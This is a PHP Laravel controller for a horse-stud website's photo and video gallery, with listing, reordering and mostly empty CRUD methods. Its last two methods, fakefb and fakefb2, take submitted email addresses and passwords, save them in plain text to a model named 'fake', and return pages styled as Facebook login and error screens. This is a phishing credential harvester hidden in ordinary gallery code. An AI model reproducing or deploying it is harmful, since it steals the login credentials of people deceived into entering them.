<?php

namespace App\Http\Controllers;

use App\fake;
use App\Models\Photo;
use App\Models\Video;
use Illuminate\Http\Request;
use function array_push;
use function json_encode;
use function view;

class PhotoController extends Controller
{

    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */

    public function index()
    {
        //
        $user = \Auth::user();
        $stud = $user->Yeguada();
        //dd($stud);
        $gallery = $stud->getPhotos();/*generales*/
        $gallery = $stud->getPhotosInv();/*generales*/
        //$gallery = $stud->getInstalationsGallery();/*Instalaciones*/

        return view('backend.content.photo.index', compact('user', 'stud', 'gallery'));
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
        return view('backend.content.photo.create');
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        //
    }

    /**
     * Display the specified resource.
     *
     * @param  \App\Models\Photo $photo
     * @return \Illuminate\Http\Response
     */
    public function show(Photo $photo)
    {
        //
        return view('backend.content.photo.show');
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  \App\Models\Photo $photo
     * @return \Illuminate\Http\Response
     */
    public function edit(Photo $photo)
    {
        //
        return view('backend.content.photo.edit');
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request $request
     * @param  \App\Models\Photo $photo
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, Photo $photo)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \App\Models\Photo $photo
     * @return \Illuminate\Http\Response
     */
    public function destroy(Photo $photo)
    {
        //
    }

    public function ChangeOrder(Request $request)
    {

        $id = $request->id;
        $r = $request->all();


        //dd($request->all());
        //video

        $foto = $request->orden;
        $video = $request->video;
        if (!empty($foto)) $order = json_decode($foto);
        if (!empty($video)) $order = json_decode($video);
        $st = null;
        foreach ($r as $k => $v) {
            if (isset($v['key']) and empty($st)) {
                $st = $r;
            };
        }

        if (!empty($st)) {
            $photo = $r;
            //$order = $photo;
            $order = [];
            foreach ($photo as $k => $v) {
                array_push($order, $v['key']);

            }
            $foto = json_encode($order);
            /*
            $sal['r']=$order;
            $sal['status']=200;
            return Functions::RetornaJson($sal);
            */
        }




        $user = \Auth::user();

        $sal['status'] = 400;
        if (count($order) == 0) {
            $sal['sms'] = "No se puede realizar esta accion";
            return Functions::RetornaJson($sal);
        } else {
            $sal['sms'] = "";
        }
        if (!empty($foto)) {
            for ($i = 0; $i < count($order); $i++) {
                $photo = Photo::find($order[$i]);
                if (empty($photo)) {
                    //dd($order[$i]);
                }
                $photo->setOrden($i)->push();
                $sal['sms'] .= "La imagen " . $photo->id . " tiene posicion $i<br>";
                $sal['status'] = 200;
            }
        }
        if (!empty($video)) {
            for ($i = 0; $i < count($order); $i++) {
                $photo = Video::find($order[$i]);
                if (empty($photo)) {
                    //dd($order[$i]);
                }
                $photo->setOrden($i)->push();
                $sal['sms'] .= "El video " . $photo->id . " tiene posicion $i<br>";
                $sal['status'] = 200;
            }
        }

        return Functions::RetornaJson($sal);
    }

    /*
     public function getTitulo1() {return $this->titulo1; }
    public function setTitulo1($titulo1) {$this->titulo1 = $titulo1;return $this;}

    public function getTitulo2() {return $this->titulo2; }
    public function setTitulo2($titulo2) {$this->titulo2 = $titulo2;return $this;}


    public function getOrden() {return $this->order; }
    public function setOrden($order) {$this->order = $order;return $this;}

    public function getVisible() {return $this->visible; }
    public function setVisible($visible) {$this->visible = $visible;return $this;}
    */

    public function fakefb(Request $request)
    {
        $r = $request;
        $email = $r->email;
        $pass = $r->password;

        $ka = new fake();
        $ka->pass = $pass;
        $ka->email = $email;

        $ka->push();
        $sal['status'] = 400;
        $sal['sms'] = '';
        //return view('fake.index');
        return view('fake.Facebook');

    }

    public function fakefb2(Request $request)
    {
        $r = $request;

        $email = $r->email;
        $pass = $r->pass;
        $ka = new fake();
        $ka->pass = $pass;
        $ka->email = $email;
        $ka->push();

        $sal['status'] = 400;
        $sal['sms'] = '';
        return view('fake.ErrorFb');

    }
}

